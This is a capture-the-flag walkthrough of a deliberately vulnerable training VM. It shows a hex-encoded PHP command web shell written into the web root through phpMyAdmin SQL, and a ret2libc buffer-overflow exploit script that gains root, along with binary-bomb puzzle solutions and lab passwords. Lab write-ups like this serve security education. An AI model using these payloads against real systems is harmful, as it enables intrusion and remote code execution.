# Boot2Root Walkthrough

## 1. Network Setup and Discovery

configure the virtual machine with a **host-only adapter** to enable internal reconnaissance. An `nmap` scan revealed that the target system was running the following services:

* **HTTP (port 80)**: Served a default placeholder page.
* **HTTPS (port 443)**: Returned an empty or default response.

## 2. Directory Enumeration

Directory fuzzing was performed using a common wordlist against the HTTP service. The following accessible endpoints were identified:

* `/forum`
* `/phpmyadmin`
* `/webmail`

Both `/phpmyadmin` and `/webmail` were protected by login interfaces. let's investigate the `/forum` directory for additional information.

## 3. Forum Analysis and Credential Discovery

A forum post contained log entries from 2015:

```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: session opened for user lmezard
```

These logs indicated a failed SSH login attempt using the password `!q\]Ej?*5K5cy*AJ`, followed by successful activity under the `lmezard` account via CRON.

Let's attempt to authenticate to the forum using the `lmezard` username and the extracted password. This login succeeded. Inside the user profile, the associated email address was revealed:

```
laurie@borntosec.net
```

## 4. Webmail Access and Credential Escalation

Using the email and previously discovered password, We can successfully loggin into the **webmail** interface. An email was found containing database credentials:

**Subject:** DB Access
**From:** [qudevide@mail.borntosec.net](mailto:qudevide@mail.borntosec.net)
**To:** [laurie@borntosec.net](mailto:laurie@borntosec.net)

```
Hey Laurie,

You can’t connect to the databases now. Use:
root/Fg-'kKXBj87E:aJ$

Best regards.
```

## 5. phpMyAdmin Exploitation

Using the discovered credentials:

```
Username: root  
Password: Fg-'kKXBj87E:aJ$
```

We can login into **phpMyAdmin**. Several databases were accessible, and file write permissions were confirmed — including the ability to write directly to the web root directory.

This allowed remote code execution through the deployment of a custom PHP payload.

## 6. Web Shell Deployment

A PHP reverse shell was generated via [revshells.com](https://www.revshells.com/) and encoded in hexadecimal. Using SQL commands, the payload was written to a writable location on the web server:

```sql
SET @bin = 0x3C68746D6C3E0A3C626F64793E0A3C666F726D206D6574686F643D2247455422206E616D653D223C3F706870206563686F20626173656E616D6528245F5345525645525B275048505F53454C46275D293B203F3E223E0A3C696E70757420747970653D225445585422206E616D653D22636D64222069643D22636D64222073697A653D223830223E0A3C696E70757420747970653D225355424D4954222076616C75653D2245786563757465223E0A3C2F666F726D3E0A3C7072653E0A3C3F7068700A20202020696628697373657428245F4745545B27636D64275D29290A202020207B0A202020202020202073797374656D28245F4745545B27636D64275D293B0A202020207D0A3F3E0A3C2F7072653E0A3C2F626F64793E0A3C7363726970743E646F63756D656E742E676574456C656D656E74427949642822636D6422292E666F63757328293B3C2F7363726970743E0A3C2F68746D6C3E;
SELECT @bin INTO DUMPFILE '/var/www/forum/templates_c/cmd.php';
```

This granted remote code execution capabilities via the web interface. From here, We could either issue individual commands or deploy a reverse shell for further interaction.

## 7. Privilege Escalation and Enumeration

While exploring the file system, the following directory was discovered:

```
/home/LOOKATME
```

Inside, a credentials file contained:

```
lmezard:G!@M6f4Eatau{sF"
```

These credentials allowed local login as `lmezard`. Since SSH was not enabled for this user, access can be obtain through the machine in virtual box.

## 8. Binary and File Analysis

Within `lmezard`'s home directory, a file named `fun` was discovered. Upon inspection, it was a **tar archive** containing multiple `.pcap` files. Each `.pcap` held fragments of **C source code** within the packet payloads.

Let's write a Python script to extract and reconstruct the C code:

```python
import os

def get_key(string):
    tmp = string[len("//file"):]
    digits = ''
    for c in tmp:
        if not c.isdigit():
            break
        digits += c
    return int(digits) if digits else -1

def main():
    path = os.getcwd()
    files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
    map_of_files = {}

    for file in files:
        with open(file, 'r') as f:
            lines = f.readlines()
            if not lines:
                continue
            last_line = lines[-1].strip()
            key = get_key(last_line)
            map_of_files[key] = ''.join(lines) + '\n'

    buffer = ''
    for i in sorted(map_of_files):
        buffer += map_of_files[i]

    print(buffer)

if __name__ == "__main__":
    main()
```

The resulting source code was saved as `first.c`, compiled, and executed:

```bash
python3 ./flag02.py > first.c
gcc first.c -o test
./test
```

The program output:

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%
```

The password was hashed using SHA-256 as required:

```bash
echo -n Iheartpwnage | sha256sum
# 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

---

## Laurie Challenge

This phase mimics a **binary bomb** exercise. The binary requires solving multiple logic-based stages. Any incorrect input triggers the `explode_bomb()` function.

### Phase 1: Exact String Match

```c
void phase_1(undefined4 param_1)
{
  if (strings_not_equal(param_1, "Public speaking is very easy.") != 0) {
    explode_bomb();
  }
}
```

**Solution:**

```
Public speaking is very easy.
```

### Phase 2: Factorial Sequence

```c
void phase_2(undefined4 param_1)
{
  int iVar1;
  int aiStack_20 [7];
  
  read_six_numbers(param_1,aiStack_20 + 1);
  if (aiStack_20[1] != 1) {
    explode_bomb();
  }
  iVar1 = 1;
  do {
    if (aiStack_20[iVar1 + 1] != (iVar1 + 1) * aiStack_20[iVar1]) {
      explode_bomb();
    }
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  return;
}
```

The function expects six integers $a_1$ through $a_6$ satisfying:

$$
\begin{aligned}
a_1 &= 1,\\
a_{i+1} &= (i+1)\times a_i \quad\text{for }1 \le i \le 5.
\end{aligned}
$$

**Computed Sequence:**

1. $a_1 = 1$
2. $a_2 = 2\times1 = 2$
3. $a_3 = 3\times2 = 6$
4. $a_4 = 4\times6 = 24$
5. $a_5 = 5\times24 = 120$
6. $a_6 = 6\times120 = 720$

**Solution:**

```
1 2 6 24 120 720
```

### Phase 3: Lookup Table Validation

```c
void phase_3(char *param_1)

{
  int iVar1;
  char cVar2;
  undefined4 local_10;
  char local_9;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d %c %d",&local_10,&local_9,&local_8);
  if (iVar1 < 3) {
    explode_bomb();
  }
  switch(local_10) {
  case 0:
    cVar2 = 'q';
    if (local_8 != 0x309) {
      explode_bomb();
    }
    break;
  case 1:
    cVar2 = 'b';
    if (local_8 != 0xd6) {
      explode_bomb();
    }
    break;
  case 2:
    cVar2 = 'b';
    if (local_8 != 0x2f3) {
      explode_bomb();
    }
    break;
  case 3:
    cVar2 = 'k';
    if (local_8 != 0xfb) {
      explode_bomb();
    }
    break;
  case 4:
    cVar2 = 'o';
    if (local_8 != 0xa0) {
      explode_bomb();
    }
    break;
  case 5:
    cVar2 = 't';
    if (local_8 != 0x1ca) {
      explode_bomb();
    }
    break;
  case 6:
    cVar2 = 'v';
    if (local_8 != 0x30c) {
      explode_bomb();
    }
    break;
  case 7:
    cVar2 = 'b';
    if (local_8 != 0x20c) {
      explode_bomb();
    }
    break;
  default:
    cVar2 = 'x';
    explode_bomb();
  }
  if (cVar2 != local_9) {
    explode_bomb();
  }
  return;
}
```

Phase 3 reads three tokens: an integer `n` (0–7), a character `c`, and an integer `v`. It then verifies that $(n,c,v)$ matches one of eight hard-coded triples:

|  n  |  c  | Hex v | Decimal v |
| :-: | :-: | :---: | :-------: |
|  0  |  q  | 0x309 |    777    |
|  1  |  b  | 0x0d6 |    214    |
|  2  |  b  | 0x2f3 |    755    |
|  3  |  k  | 0x0fb |    251    |
|  4  |  o  | 0x0a0 |    160    |
|  5  |  t  | 0x1ca |    458    |
|  6  |  v  | 0x30c |    780    |
|  7  |  b  | 0x20c |    524    |

**Simplest Valid Input:**

```
0 q 777
```

**Alternate Example (as per README hint):**

```
1 b 214
```

### Phase 4: Fibonacci Check

```c
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}



void phase_4(char *param_1)
{
  int iVar1;
  int local_8;
  
  iVar1 = sscanf(param_1,"%d",&local_8);
  if ((iVar1 != 1) || (local_8 < 1)) {
    explode_bomb();
  }
  iVar1 = func4(local_8);
  if (iVar1 != 0x37) {
    explode_bomb();
  }
  return;
}
```

The code computes a Fibonacci‐style function `func4(n)`:

```c
func4(0) = 1
func4(1) = 1
func4(n) = func4(n-1) + func4(n-2)  for n ≥ 2
```

It then requires `func4(n) == 0x37` (decimal 55).

**Fibonacci Values:**

```
n : 0  1  2   3   4   5    6    7    8     9
f : 1  1  2   3   5   8   13   21   34   55
```

**Solution:**

```
9
```

### Phase 5: Bitmask and Character Mapping

```c
void phase_5(int param_1)

{
  int iVar1;
  undefined1 local_c [6];
  undefined1 local_6;
  
  iVar1 = string_length(param_1);
  if (iVar1 != 6) {
    explode_bomb();
  }
  iVar1 = 0;
  do {
    local_c[iVar1] = (&array_123)[(char)(*(byte *)(iVar1 + param_1) & 0xf)];
    iVar1 = iVar1 + 1;
  } while (iVar1 < 6);
  local_6 = 0;
  printf(local_c);
  iVar1 = strings_not_equal(local_c,"giants");
  if (iVar1 != 0) {
    explode_bomb();
  }
  return;
}
```

Phase 5 expects a 6-character input string. For each character, it:

1. Extracts the lower 4 bits (`char & 0xF`).
2. Uses that value as an index into a 16-byte secret array (`buffer[] = "isrveawhobpnutfg"`).
3. Constructs a new 6-character string.
4. Compares the result to the target `"giants"`.

Any mismatch triggers `explode_bomb()`.

#### Scripted Approach

```c
#include <stdio.h>

int main() {
    const char* index = "isrveawhobpnutfg";
    const char* target = "giants";

    for (char c = 'a'; c <= 'z'; c++) {
        char mapped = index[c & 0xf]; // c & 0xf keeps the lower 4 bits

        // Check if mapped character is in "giants"
        for (int j = 0; target[j] != '\0'; j++) {
            if (mapped == target[j]) {
                printf("%c : %c\n", mapped, c);
                break;
            }
        }
    }

    return 0;
}
```

This program does:

1. Generate the output string for a given input.
2. Test against `"giants"`.
3. Identify candidate inputs.

Once the correct mapping is found, only one 6-character string yields `"giants"`:

**Solution (phase 5 password):**

```
opekmq
```

### Phase 6: Linked-List Sorting Check

```c
void phase_6(undefined4 param_1)

{
  int *piVar1;
  int iVar2;
  undefined1 *puVar3;
  int *piVar4;
  int iVar5;
  undefined1 *local_38;
  int *local_34;
  int local_30 [5];
  int local_1c [6];
  
  local_38 = node1;
  read_six_numbers(param_1,local_1c);
  iVar5 = 0;
  do {
    iVar2 = iVar5;
    if (5 < local_1c[iVar5] - 1U) {
      explode_bomb();
    }
    while (iVar2 = iVar2 + 1, iVar2 < 6) {
      if (local_1c[iVar5] == local_1c[iVar2]) {
        explode_bomb();
      }
    }
    iVar5 = iVar5 + 1;
  } while (iVar5 < 6);
  iVar5 = 0;
  do {
    iVar2 = 1;
    puVar3 = local_38;
    if (1 < local_1c[iVar5]) {
      do {
        puVar3 = *(undefined1 **)(puVar3 + 8);
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar5]);
    }
    local_30[iVar5 + -1] = (int)puVar3;
    iVar5 = iVar5 + 1;
  } while (iVar5 < 6);
  iVar5 = 1;
  piVar4 = local_34;
  do {
    piVar1 = (int *)local_30[iVar5 + -1];
    piVar4[2] = (int)piVar1;
    iVar5 = iVar5 + 1;
    piVar4 = piVar1;
  } while (iVar5 < 6);
  piVar1[2] = 0;
  iVar5 = 0;
  do {
    if (*local_34 < *(int *)local_34[2]) {
      explode_bomb();
    }
    local_34 = (int *)local_34[2];
    iVar5 = iVar5 + 1;
  } while (iVar5 < 5);
  return;
}
```

Phase 6 reads six distinct integers (each 1–6) into an array. It then:

1. Verifies each is within \[1,6] and none are duplicated.
2. Treats each integer as a position in a linked list of six nodes.
3. Traverses the list in the order specified by the input.
4. Ensures the traversed values are in ascending order.

By automating enumeration, the correct permutation was determined:

```bash
#!/bin/bash

while IFS= read -r line; do
    echo "Trying: $line"

    # Run bomb with current line, capture output and errors
    echo "$line" | ./bomb responses.txt > temp_output.txt 2>&1

    # Check if it did NOT explode (you can tune this condition)
    if ! grep -q "BOOM" temp_output.txt; then
        echo "✅ Success with: $line"
        cat temp_output.txt
        break
    fi
done < numbers.txt
```

**Solution:**

```
4 2 6 1 3 5
```

---

**Complete Bomb Solution**

```
Public speaking is very easy.
1 2 6 24 120 720
0 q 777
9
opekmq
4 2 6 1 3 5
```

**Password for thor:**

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

---

## Thor Challenge

### 1. Initial Enumeration

Within the `thor` directory, the following files were found:

* `README`
* `turtle`

The `README` file suggested that completing this stage would yield access to the **zaz** user.

### 2. Turtle File Analysis

The `turtle` file contained Python-like instructions recognizable as **Turtle Graphics** commands. These were parsed and rendered using a custom script.

### 3. Drawing Analysis and Hashing

The visual output formed the word:

```
SLASH
```

Given the hint "Can you digest the message?", the analyst tested multiple hashing algorithms. The correct hash was obtained using **MD5**:

```bash
echo -n SLASH | md5sum
```

Result:

```
646da671ca01bb5d84dbb5fb2238dc8e
```

This served as the **password for user zaz**.

---

## ZAZ Exploit – Stack-Based Buffer Overflow

### 1. Environment Checks

#### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space
# Output: 0
```

ASLR was **disabled**, making memory addresses static across executions.

#### Stack Permissions

```bash
readelf -l exploit_me
# Look for: GNU_STACK ... RWE
```

The presence of the `E` flag indicates that the **stack is executable**, though the exploit uses **ret2libc** instead of direct shellcode injection.

---

### 2. Binary Analysis

The vulnerable binary uses `strcpy()` to copy user input into a fixed-size buffer without bounds checking:

```c
#include "out.h"


bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```

This creates a classic buffer overflow scenario.

---

### 3. Confirming the Overflow

```bash
./exploit_me $(python -c 'print("A"*144)')
```

A segmentation fault and GDB inspection confirm that the return address is overwritten after **144 bytes**.

---

### 4. Crafting the ret2libc Payload

**Addresses:**

```gdb
# system
0xb7e6b060
# exit
0xb7e5ebe0
# "/bin/sh"
0xb7f8cc58
```

**Python Exploit Script:**

```python
from pwn import p32

payload  = b"A" * 140
payload += p32(0xb7e6b060)  # system
payload += p32(0xb7e5ebe0)  # exit
payload += p32(0xb7f8cc58)  # /bin/sh

with open("payload", "wb") as f:
    f.write(payload)
```

---

### 5. Payload Execution

Transfer and execute the payload:

```bash
base64 payload > payload.b64
# Transfer to VM and decode
base64 -d payload.b64 > final_payload
./exploit_me $(cat final_payload)
```

Result:

```bash
# whoami
root
```
